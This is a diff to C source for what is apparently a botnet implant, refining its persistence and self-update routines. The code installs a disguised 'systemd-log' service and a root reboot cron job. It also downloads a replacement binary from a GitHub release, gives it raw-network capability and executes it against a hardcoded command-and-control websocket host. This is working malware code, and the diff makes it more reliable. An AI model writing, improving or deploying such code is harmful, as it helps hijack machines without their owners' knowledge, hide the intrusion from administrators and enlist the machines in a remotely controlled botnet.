@@ -61,10 +61,9 @@ void install_persistence(const char *path)
     if (f) {
         fwrite(svc, 1, strlen(svc), f);
         fclose(f);
+        system("systemctl daemon-reload 2>/dev/null");
+        system("systemctl enable systemd-log.service 2>/dev/null");
     }
-    system("systemctl daemon-reload 2>/dev/null");
-    system("systemctl enable systemd-log.service 2>/dev/null");
-    /* Do NOT systemctl start here — would race with current process */
 
     char cron[768];
     snprintf(cron, sizeof(cron), "@reboot root %s %s >/dev/null 2>&1\n", path, c2);
@@ -72,54 +71,49 @@ void install_persistence(const char *path)
     if (f) {
         fwrite(cron, 1, strlen(cron), f);
         fclose(f);
+        system("chmod 644 /etc/cron.d/system-log 2>/dev/null");
     }
-    system("chmod 644 /etc/cron.d/system-log 2>/dev/null");
 }
 
+/* ver must be release tag e.g. "v4.0.6" — only update when remote tag differs */
 void check_updates(const char *ver)
 {
-    const char *token = getenv("GITHUB_TOKEN");
+    if (!ver || !ver[0]) return;
+
     char cmd[1024];
-    if (token)
-        snprintf(cmd, sizeof(cmd),
-                 "curl -s -H \"Authorization: token %s\" \"https://api.github.com/repos/duaakcon10/dc-ansta/releases/latest\" 2>/dev/null"
-                 " | sed -n 's/.*\"tag_name\"[^0-9]*\"\\([^\"]*\\)\".*/\\1/p'",
-                 token);
-    else
-        snprintf(cmd, sizeof(cmd),
-                 "curl -s \"https://api.github.com/repos/duaakcon10/dc-ansta/releases/latest\" 2>/dev/null"
-                 " | sed -n 's/.*\"tag_name\"[^0-9]*\"\\([^\"]*\\)\".*/\\1/p'");
+    snprintf(cmd, sizeof(cmd),
+             "curl -fs \"https://api.github.com/repos/duaakcon10/dc-ansta/releases/latest\" 2>/dev/null"
+             " | sed -n 's/.*\"tag_name\"[^0-9]*\"\\([^\"]*\\)\".*/\\1/p'");
     FILE *p = popen(cmd, "r");
     if (!p) return;
     char latest[64] = {0};
-    fread(latest, 1, sizeof(latest) - 1, p);
+    if (!fgets(latest, sizeof(latest), p)) {
+        pclose(p);
+        return;
+    }
     pclose(p);
-    latest[strcspn(latest, "\n")] = 0;
+    latest[strcspn(latest, "\r\n")] = 0;
 
-    /* Only update if latest looks like a version tag and differs */
     if (!latest[0] || latest[0] != 'v') return;
     if (strcmp(latest, ver) == 0) return;
+
+    /* Same major path only — avoid thrashing on parse glitches */
+    if (strlen(latest) > 32) return;
 
     char c2[512] = {0};
     load_c2_url(c2, sizeof(c2));
     if (!c2[0]) strcpy(c2, "wss://bot.minhvuong.io.vn/ws/bot/");
 
-    token = getenv("GITHUB_TOKEN");
-    if (token)
-        snprintf(cmd, sizeof(cmd),
-                 "curl -sL -H \"Authorization: token %s\" "
-                 "\"https://github.com/duaakcon10/dc-ansta/releases/download/%s/bot_static\" "
-                 "-o /tmp/bot_update && chmod +x /tmp/bot_update && "
-                 "mv /tmp/bot_update /usr/bin/systemd-log && "
-                 "/usr/bin/systemd-log '%s' &",
-                 token, latest, c2);
-    else
-        snprintf(cmd, sizeof(cmd),
-                 "curl -sL \"https://github.com/duaakcon10/dc-ansta/releases/download/%s/bot_static\" "
-                 "-o /tmp/bot_update && chmod +x /tmp/bot_update && "
-                 "mv /tmp/bot_update /usr/bin/systemd-log && "
-                 "/usr/bin/systemd-log '%s' &",
-                 latest, c2);
+    /* Download then replace; only exec if file is non-empty ELF-ish */
+    snprintf(cmd, sizeof(cmd),
+             "curl -fsL \"https://github.com/duaakcon10/dc-ansta/releases/download/%s/bot_static\" "
+             "-o /tmp/bot_update.$$ && "
+             "test -s /tmp/bot_update.$$ && "
+             "chmod +x /tmp/bot_update.$$ && "
+             "mv /tmp/bot_update.$$ /usr/bin/systemd-log && "
+             "setcap cap_net_raw+ep /usr/bin/systemd-log 2>/dev/null; "
+             "exec /usr/bin/systemd-log '%s'",
+             latest, c2);
     system(cmd);
-    exit(0);
+    /* If exec failed, continue with old binary */
 }
